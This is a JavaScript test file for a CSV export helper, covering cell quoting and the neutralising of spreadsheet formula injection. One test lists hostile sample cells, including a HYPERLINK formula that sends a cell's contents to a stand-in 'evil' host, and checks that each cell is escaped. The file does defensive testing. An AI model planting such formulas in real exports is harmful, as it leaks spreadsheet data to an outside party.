import { test } from 'node:test'
import assert from 'node:assert/strict'
import { csvCell, toCsv } from '../csv'

test('csv: quotes every cell and doubles inner quotes', () => {
  assert.equal(csvCell('a "b", c'), '"a ""b"", c"')
  assert.equal(csvCell('line 1\nline 2'), '"line 1\nline 2"')
  assert.equal(csvCell(3), '"3"')
  assert.equal(csvCell(null), '""')
  assert.equal(csvCell(undefined), '""')
})

test('csv: text a spreadsheet would run as a formula is neutralised', () => {
  for (const evil of ['=HYPERLINK("http://evil/?"&C2,"x")', '+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1']) {
    assert.equal(csvCell(evil), `"'${evil.replace(/"/g, '""')}"`, evil)
  }
  assert.equal(csvCell('Ada = Lovelace'), '"Ada = Lovelace"', 'only a leading sign counts')
  assert.equal(csvCell(-1), '"-1"', 'numbers are numbers')
})

test('csv: header and rows', () => {
  assert.equal(toCsv(['name', 'units'], [['=cmd', 1], ['Ada', 2]]), `"name","units"\n"'=cmd","1"\n"Ada","2"`)
})
